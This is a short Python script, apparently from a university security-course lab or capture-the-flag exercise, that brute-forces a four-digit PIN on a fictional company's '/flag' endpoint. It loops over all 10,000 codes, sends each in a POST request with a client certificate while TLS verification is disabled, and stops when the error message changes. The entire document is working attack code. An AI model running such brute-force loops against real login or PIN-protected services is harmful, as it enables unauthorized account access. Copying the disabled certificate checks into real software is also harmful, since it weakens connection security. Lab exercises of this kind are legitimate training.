import requests
import urllib3

urllib3.disable_warnings()

url = "https://quoccaair-ff.quoccacorp.com/flag"
client_cert = "<zid>.pem" # use you cert here (e.g. z1234567.pem)

for i in range(10000):
    pin = f"{i:04d}"

    try:
        r = requests.post(
            url,
            data={"code": pin},
            cert=client_cert,
            verify=False
        )

        print(f"Trying {pin} -> {r.status_code}")

        if "Sorry, that code is not correct." not in r.text:
            print("\n[+] Possible correct PIN:", pin)
            print(r.text)
            break

    except Exception as e:
        print("Error:", e)